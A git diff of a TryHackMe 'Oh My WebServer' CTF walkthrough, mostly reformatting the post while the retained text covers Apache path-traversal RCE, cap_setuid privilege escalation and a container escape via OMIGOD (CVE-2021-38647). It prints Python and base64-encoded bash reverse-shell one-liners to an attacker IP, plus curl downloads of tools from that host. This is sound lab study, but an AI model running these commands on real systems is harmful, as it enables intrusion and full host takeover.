@@ -1,6 +1,13 @@
-# TryHackMe - Oh My WebServer CTF Walkthrough
+---
+title: "TryHackMe - Oh My WebServer CTF Walkthrough"
+date: 2026-01-01
+categories: [Writeups]
+tags: [Writeups, TryHackMe]
+image:
+  path: /assets/img/posts/tryhackme/oh-my-webserver/c1833021c98fa6c74fc125f4b34741ca.png
+---
 
-![image.png](image.png)
+![image.png](/assets/img/posts/tryhackme/oh-my-webserver/image.png)
 
 ## Introduction
 
@@ -63,13 +70,13 @@ A public proof-of-concept exploit is available at:
 
 After downloading the PoC, it was executed against the target:
 
-```
+```bash
 $ python3 exploit.py 10.81.154.53 80 rce 'id'
 ```
 
 The exploit successfully confirmed that the host was vulnerable and returned command execution:
 
-```
+```bash
 [i] Host appears to be vulnerable.
 [*] Working Payload: http://10.81.154.53:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
 
@@ -83,13 +90,13 @@ Since the initial shell was limited and not fully interactive, a reverse shell w
 
 First, a listener was started on the attacking machine:
 
-```
+```bash
 $ nc -lvnp 4444
 ```
 
 Then a Python reverse shell was executed on the target:
 
-```
+```bash
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.211.0",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
 ```
 
@@ -101,7 +108,7 @@ connect to [192.168.211.0] from (UNKNOWN) [10.81.154.53] 51682
 
 After upgrading the shell to a proper TTY using Python’s `pty` module, the session became fully interactive:
 
-```
+```bash
 daemon@4a70924bafa0:/bin$
 ```
 
@@ -109,7 +116,7 @@ At this point, enumeration began. The `/home` directory was empty, and nothing o
 
 However, while inspecting the root directory, an important detail was discovered: the presence of the `.dockerenv` file.
 
-```
+```bash
 -rwxr-xr-x   1 root root    0 Feb 23  2022 .dockerenv
 ```
 
@@ -123,13 +130,13 @@ To identify potential vectors for gaining higher-level access, the focus shifted
 
 To perform deeper privilege escalation checks, LinPEAS was transferred to the target machine using a simple Python HTTP server on the attacker side.
 
-```
+```bash
 $ python3 -m http.server
 ```
 
 From the target:
 
-```
+```bash
 cd /tmp
 curl http://192.168.211.0:8000/linpeas.sh -o linpeas.sh
 chmod +x linpeas.sh
@@ -138,11 +145,11 @@ chmod +x linpeas.sh
 
 LinPEAS confirmed that we were indeed inside a Docker container. 
 
-![image.png](image%201.png)
+![image.png](/assets/img/posts/tryhackme/oh-my-webserver/image%201.png)
 
 More importantly, it revealed a critical finding:
 
-```
+```bash
 /usr/bin/python3.7 = cap_setuid+ep
 ```
 
@@ -161,20 +168,20 @@ In practical terms, this means that even though we were running as the `daemon` 
 
 This was exploited with the following command:
 
-```
+```bash
 python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
 Immediately, the prompt changed to root:
 
-```
+```bash
 root@4a70924bafa0:/tmp# id
 uid=0(root) gid=1(daemon) groups=1(daemon)
 ```
 
 With root access in the container, the first flag was retrieved from `/root/user.txt`.
 
-```
+```bash
 root@4a70924bafa0:/root# cat user.txt
 THM{REDACTED}
 ```
@@ -185,14 +192,14 @@ Although we now had root privileges, we were still confined to the Docker contai
 
 The `ss` command was unavailable, so a static `nmap` binary was transferred to perform internal network enumeration.
 
-```
+```bash
 curl http://192.168.211.0:8000/nmap -o nmap
 chmod +x nmap
 ```
 
 Checking the network configuration revealed the container IP address:
 
-```
+```bash
 root@4a70924bafa0:/root# ifconfig
 ifconfig
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
@@ -216,7 +223,7 @@ In typical Docker setups, containers are connected to a virtual bridge (`docker0
 
 A port scan was performed against the gateway:
 
-```
+```bash
 ./nmap 172.17.0.1 -p- --min-rate 5000
 ```
 
@@ -244,14 +251,14 @@ A public exploit for CVE-2021-38647 can be found at:
 
 The exploit was transferred to the container:
 
-```
+```bash
 curl http://192.168.211.0:8000/omigod.py -o omigod.py
 chmod +x omigod.py
 ```
 
 The exploit was executed against the host and the result confirmed root execution on the host:
 
-```
+```bash
 root@4a70924bafa0:/tmp# python3 omigod.py -t 172.17.0.1 -p 5986 -c id
 python3 omigod.py -t 172.17.0.1 -p 5986 -c id
 uid=0(root) gid=0(root) groups=0(root)
@@ -259,25 +266,25 @@ uid=0(root) gid=0(root) groups=0(root)
 
 With remote root execution confirmed, the focus shifted to establishing a stable, interactive shell. To circumvent complex quoting and character escaping issues, the reverse shell payload was delivered as a **Base64-encoded** string. 
 
-```
+```bash
 root@4a70924bafa0:/tmp# python3 omigod.py -t 172.17.0.1 -p 5986 -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxMS4wLzQ0NDUgMD4mMQo= | base64 -d | bash" <TIuMTY4LjIxMS4wLzQ0NDUgMD4mMQo= | base64 -d | bash"
 ```
 
 Upon execution, the listener caught a connection that verified full, uncontained root access to the host system:
 
-```
+```bash
 root@ubuntu:/var/opt/microsoft/scx/tmp#
 ```
 
 Verifying privileges:
 
-```
+```bash
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
 Finally, the root flag was retrieved from `/root/root.txt`.
 
-```
+```bash
 root@ubuntu:/root# cat root.txt	
 THM{REDACTED}
 ```
